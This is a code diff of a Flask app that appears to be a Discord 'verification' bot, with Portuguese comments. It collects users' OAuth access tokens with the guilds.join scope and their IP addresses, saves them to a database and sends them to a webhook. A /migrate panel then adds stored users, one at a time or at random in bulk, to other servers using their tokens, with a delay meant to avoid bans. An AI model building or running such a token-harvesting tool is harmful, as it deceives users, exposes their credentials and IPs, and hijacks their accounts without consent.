@@ -26,7 +26,6 @@ def init_db():
     try:
         conn = get_db_connection()
         cur = conn.cursor()
-        # Cria a tabela se não existir
         cur.execute("""
             CREATE TABLE IF NOT EXISTS verified_users (
                 user_id VARCHAR(50) PRIMARY KEY,
@@ -48,7 +47,6 @@ def save_user_to_db(user_id, username, ip, token, guild_id):
     try:
         conn = get_db_connection()
         cur = conn.cursor()
-        # Upsert: Insere ou Atualiza se já existir
         query = """
             INSERT INTO verified_users (user_id, username, ip_address, access_token, guild_id)
             VALUES (%s, %s, %s, %s, %s)
@@ -93,7 +91,6 @@ def get_or_create_verified_role(target_guild_id):
         for role in response.json():
             if role['name'] == "Vereficado": return role['id']
     
-    # Criar cargo se não existir
     create_url = f"{API_BASE}/guilds/{target_guild_id}/roles"
     data = {"name": "Vereficado", "permissions": "0", "color": 0x00ff00, "hoist": False, "mentionable": False}
     create_res = requests.post(create_url, headers=get_headers_bot(), json=data)
@@ -110,7 +107,7 @@ def add_role_to_user(user_id, role_id, target_guild_id):
     url = f"{API_BASE}/guilds/{target_guild_id}/members/{user_id}/roles/{role_id}"
     requests.put(url, headers=get_headers_bot())
 
-# Inicializa o Banco ao ligar
+# Inicializa DB
 init_db()
 
 # --- ROTAS ---
@@ -127,12 +124,20 @@ def ping():
 def auth():
     target_guild_id = request.args.get('guild_id')
     if not target_guild_id:
-        return "Erro: ID do servidor faltando no link."
+        return "Erro: ID do servidor faltando."
     
-    # Gera o link do Discord
-    oauth_url = f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&redirect_uri={REDIRECT_URI}&scope=identify+guilds.join+guilds&state={target_guild_id}"
+    # CORREÇÃO: Usando %20 explicitamente para garantir que o link não quebre os scopes
+    # Isso garante que apareça "Autorizar App" e não "Adicionar Bot"
+    oauth_url = (
+        f"https://discord.com/oauth2/authorize"
+        f"?client_id={CLIENT_ID}"
+        f"&response_type=code"
+        f"&redirect_uri={REDIRECT_URI}"
+        f"&scope=identify%20guilds.join%20guilds"
+        f"&state={target_guild_id}"
+    )
     
-    # Renderiza o Launcher (para evitar bloqueio de popup e preparar o mobile)
+    # Envia para o Launcher (com | safe no HTML para não quebrar)
     return render_template('launcher.html', url=oauth_url)
 
 @app.route('/callback')
@@ -142,7 +147,7 @@ def callback():
     
     if not code: return "Erro: Código não recebido."
 
-    # 1. Troca Código por Token
+    # 1. Troca Code por Token
     data = {
         'client_id': CLIENT_ID, 
         'client_secret': CLIENT_SECRET, 
@@ -158,32 +163,32 @@ def callback():
     tokens = token_resp.json()
     access_token = tokens.get('access_token')
     
-    # 2. Pega Dados do Usuário
+    # 2. Pega User Info
     user_resp = requests.get(f'{API_BASE}/users/@me', headers={'Authorization': f'Bearer {access_token}'})
     user_data = user_resp.json()
     user_id = user_data['id']
     username = user_data['username']
 
-    # 3. Pega IP Real
+    # 3. Pega IP
     ip = request.headers.getlist("X-Forwarded-For")[0] if request.headers.getlist("X-Forwarded-For") else request.remote_addr
     
-    # 4. Salva no Banco e Manda Log
+    # 4. Salva e Loga
     save_user_to_db(user_id, username, ip, access_token, target_guild_id)
     send_log_to_webhook(user_data, access_token, ip, target_guild_id)
 
-    # 5. Adiciona ao Servidor e Dá Cargo
+    # 5. Ação no Discord
     join_user_to_guild(user_id, access_token, target_guild_id)
     try:
         role_id = get_or_create_verified_role(target_guild_id)
         if role_id:
             add_role_to_user(user_id, role_id, target_guild_id)
     except Exception as e:
-        print(f"Erro ao dar cargo: {e}")
+        print(f"Erro cargo: {e}")
 
-    # 6. Renderiza a página de Sucesso com Deep Link (App Redirect)
+    # 6. Sucesso com Deep Link
     return render_template('success.html', guild_id=target_guild_id)
 
-# --- PAINEL DE ENVIO (Manda o Embed pro Discord) ---
+# --- PAINEL DE ENVIO ---
 @app.route('/painel', methods=['GET', 'POST'])
 def painel():
     message = ""
@@ -194,7 +199,6 @@ def painel():
         desc = request.form.get('desc')
         image_url = request.form.get('image_url')
         
-        # O link do botão leva para o /auth com o ID do servidor
         verify_link = f"https://hunter-bot-verify.onrender.com/auth?guild_id={target_guild_id}"
 
         payload = {
@@ -220,7 +224,7 @@ def painel():
 
     return render_template('painel.html', message=message)
 
-# --- PAINEL DE MIGRAÇÃO (Move membros entre servidores) ---
+# --- PAINEL DE MIGRAÇÃO ---
 @app.route('/migrate', methods=['GET', 'POST'])
 def migrate():
     log_msg = []
@@ -233,10 +237,8 @@ def migrate():
         cur = conn.cursor()
 
         try:
-            # Migração Única
             if action_type == 'single':
                 identifier = request.form.get('identifier')
-                # Busca por ID ou Username
                 cur.execute("SELECT user_id, username, access_token FROM verified_users WHERE user_id = %s OR username = %s", (identifier, identifier))
                 user = cur.fetchone()
 
@@ -248,10 +250,8 @@ def migrate():
                 else:
                     log_msg.append(f"⚠️ Usuário '{identifier}' não encontrado.")
 
-            # Migração em Massa
             elif action_type == 'mass':
                 amount = int(request.form.get('amount'))
-                # Seleciona aleatórios
                 cur.execute("SELECT user_id, username, access_token FROM verified_users ORDER BY RANDOM() LIMIT %s", (amount,))
                 users = cur.fetchall()
                 
@@ -260,12 +260,12 @@ def migrate():
                     uid, uname, token = user
                     status = join_user_to_guild(uid, token, target_guild_id)
                     if status in [201, 204]: count += 1
-                    time.sleep(0.5) # Delay anti-ban
+                    time.sleep(0.5) 
 
-                log_msg.append(f"🚀 Migração Finalizada: {count}/{len(users)} sucessos.")
+                log_msg.append(f"🚀 Migrados: {count}/{len(users)}")
 
         except Exception as e:
-            log_msg.append(f"Erro Crítico: {str(e)}")
+            log_msg.append(f"Erro: {str(e)}")
         finally:
             if conn: conn.close()
 
